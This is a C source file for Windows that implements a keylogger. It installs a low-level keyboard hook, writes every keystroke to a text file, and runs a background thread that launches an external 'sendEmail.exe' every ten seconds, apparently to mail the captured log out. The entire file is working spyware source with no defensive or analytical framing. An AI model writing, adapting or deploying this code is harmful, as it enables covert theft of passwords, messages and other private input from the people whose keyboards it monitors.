#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <process.h>


FILE *file = NULL;

const char *GetKeyName(int vkCode) {
    static char keyName[256] = {0}; 
    int scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC); 

    if (GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName)) == 0) {
        snprintf(keyName, sizeof(keyName), "VK_%02X", vkCode); 
    }

    return keyName;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;

        if (file == NULL) {
            file = fopen("sendMail\\key.txt", "w");
            if (file == NULL) {
                perror("Error opening file");
                return 1;   
            }
        }
        freopen("sendMail\\key.txt", "a", file);
        const char *keyName = GetKeyName(kbdStruct->vkCode);
        if(strcmp(keyName, "Enter") == 0)
            fprintf(file, "\n");
        else if(strcmp(keyName, "Space") == 0)
            fprintf(file, " ");
        else if(strcmp(keyName, "Esc") == 0)
            exit(1);
        else
            fprintf(file, "%s", keyName); 

        fclose(file);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SendEmail(void *arg) {
    while (1) {
        Sleep(10000);
        system("cd C:\\Users\\Admin\\Documents\\cshit\\sendMail\\dist && sendEmail.exe");
        printf("Email sent...\n");
    }
}

int main() {
    printf("Window is listening...\n");

    _beginthread(SendEmail, 0, NULL);
    
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        fprintf(stderr, "Failed to install hook\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    if (file) {
        fclose(file);
    }

    return 0;
}
